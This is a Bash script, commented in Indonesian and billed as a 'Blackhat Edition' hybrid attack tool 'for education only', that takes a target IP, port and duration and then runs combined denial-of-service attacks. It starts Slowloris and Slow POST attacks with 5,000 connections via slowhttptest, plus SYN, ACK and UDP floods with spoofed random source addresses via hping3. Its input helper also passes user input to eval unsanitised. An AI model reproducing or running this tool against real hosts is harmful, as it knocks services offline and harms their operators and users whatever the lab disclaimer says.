#!/bin/bash

# ==============================================================================
#      BRUTAL HYBRID ATTACK SCRIPT - BLACKHAT EDITION (FIXED)
#        HANYA UNTUK TUJUAN PEMBELAJARAN DI LAB YANG TERKONTROL!
#                 USE AT YOUR OWN RISK. FOR EDUCATION ONLY.
# ==============================================================================

# --- KONFIGURASI WARNA ---
if [ -t 1 ]; then
    RED=$(tput setaf 1)
    GREEN=$(tput setaf 2)
    YELLOW=$(tput setaf 3)
    BLUE=$(tput setaf 4)
    PURPLE=$(tput setaf 5)
    CYAN=$(tput setaf 6)
    NC=$(tput sgr0) # Reset Color
else
    RED=""
    GREEN=""
    YELLOW=""
    BLUE=""
    PURPLE=""
    CYAN=""
    NC=""
fi

# --- FUNGSI ---

# Fungsi untuk membersihkan layar dan menampilkan banner
show_banner() {
    clear
    printf "${RED}"
    cat << "EOF"
 ____  _ _  ____ _    _    ____ _____ ____  
|  _ \| | |/ ___| |  / \  / ___| ____|  _ \ 
| |_) | | | |   | | / _ \ \___ \  _| | | | |
|  __/| | | |___| |/ ___ \ ___) | |___| |_| |
|_|   |_|_|\____|_/_/   \_\____/|_____|____/ 
                                           
    HYBRID ATTACK SIMULATOR - BRUTAL MODE
EOF
    printf "${NC}"
    printf "${CYAN}==================================================${NC}\n"
}

# Fungsi untuk menampilkan pesan dengan warna
print_message() {
    local color=$1
    local message=$2
    printf "${color}[*] ${message}${NC}\n"
}

# Fungsi untuk meminta input dengan validasi
get_input() {
    local prompt=$1
    local var_name=$2
    local validation_regex=$3
    local error_message=$4

    while true; do
        printf "${CYAN}[?]${NC} ${prompt}: "
        read -r input
        if [[ -n "$validation_regex" && ! "$input" =~ $validation_regex ]]; then
            print_message "$RED" "$error_message"
        else
            eval "$var_name=\"$input\""
            break
        fi
    done
}

# Fungsi untuk animasi loading
loading_animation() {
    local duration=$1
    local text=$2
    local chars="/-\|"
    local i=0
    local end_time=$((SECONDS + duration))

    print_message "$YELLOW" "$text"
    while [ $SECONDS -lt $end_time ]; do
        printf "\r${YELLOW}%s${NC}" "${chars:$((i % 4)):1}"
        sleep 0.1
        ((i++))
    done
    printf "\r"
}

# Fungsi untuk membersihkan proses saat script dihentikan
cleanup() {
    echo ""
    print_message "$RED" "Menerima sinyal interupsi. Menghentikan semua operasi..."
    pkill -f "slowhttptest" > /dev/null 2>&1
    pkill -f "hping3" > /dev/null 2>&1
    print_message "$GREEN" "Semua serangan dihentikan. Sistem dibersihkan."
    tput cnorm # Tampilkan kursor
    exit 0
}

# Menangkap sinyal Ctrl+C (SIGINT) dan Ctrl+Z (SIGTSTP)
trap cleanup SIGINT SIGTSTP

# --- EKSEKUSI UTAMA ---
tput civis # Sembunyikan kursor
show_banner

# Mendapatkan input dari pengguna
get_input "Masukkan IP Target" "TARGET_IP" "^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$" "Format IP tidak valid. Coba lagi."
get_input "Masukkan Port Target (default: 80)" "TARGET_PORT" "^[0-9]+$" "Port harus berupa angka."
get_input "Masukkan durasi serangan dalam detik (default: 300)" "DURATION" "^[0-9]+$" "Durasi harus berupa angka."

TARGET_URL="http://${TARGET_IP}:${TARGET_PORT}/"
CONNECTIONS=5000 # Jumlah koneksi slowloris yang brutal

show_banner
print_message "$GREEN" "Target Terkunci: ${TARGET_IP}:${TARGET_PORT}"
print_message "$GREEN" "Durasi Serangan: ${DURATION} detik"
print_message "$GREEN" "Jumlah Koneksi Slowloris: ${CONNECTIONS}"
printf "${CYAN}==================================================${NC}\n"

loading_animation 3 "Inisialisasi vektor serangan..."
echo ""

print_message "$YELLOW" "Meluncurkan serangan Slowloris (Header Lambat)..."
slowhttptest -c "$CONNECTIONS" -H -g -o slowloris_log -i 5 -r 300 -u "$TARGET_URL" -x 24 > /dev/null 2>&1 &
sleep 1

print_message "$YELLOW" "Meluncurkan serangan Slow POST (Body Lambat)..."
slowhttptest -c "$CONNECTIONS" -B -g -o slowpost_log -i 60 -r 500 -u "$TARGET_URL" -p 4096 > /dev/null 2>&1 &
sleep 1

print_message "$YELLOW" "Meluncurkan serangan SYN Flood (IP Acak)..."
hping3 --flood -S -p "$TARGET_PORT" --rand-source "$TARGET_IP" > /dev/null 2>&1 &
sleep 1

print_message "$YELLOW" "Meluncurkan serangan ACK Flood (IP Acak)..."
hping3 --flood -A -p "$TARGET_PORT" --rand-source "$TARGET_IP" > /dev/null 2>&1 &
sleep 1

print_message "$YELLOW" "Meluncurkan serangan UDP Flood (IP Acak)..."
hping3 --flood --udp -p "$TARGET_PORT" --rand-source "$TARGET_IP" > /dev/null 2>&1 &
sleep 1

echo ""
printf "${RED}==================================================${NC}\n"
print_message "$GREEN" "SEMUA VEKTOR SERANGAN TELAH DILUNCURKAN!"
print_message "$CYAN" "Monitor server target Anda di terminal lain."
print_message "$CYAN" "Serangan akan berhenti otomatis dalam ${DURATION} detik."
print_message "$CYAN" "Atau tekan Ctrl+C untuk menghentikan paksa."
printf "${RED}==================================================${NC}\n"

# Countdown
for ((i=DURATION; i>0; i--)); do
    printf "\r${PURPLE}[*] Serangan akan berakhir dalam: %02d:%02d${NC}" $((i/60)) $((i%60))
    sleep 1
done
printf "\r${GREEN}[*] Durasi serangan habis. Membersihkan sistem...${NC}\n"

# Membersihkan setelah durasi selesai
cleanup
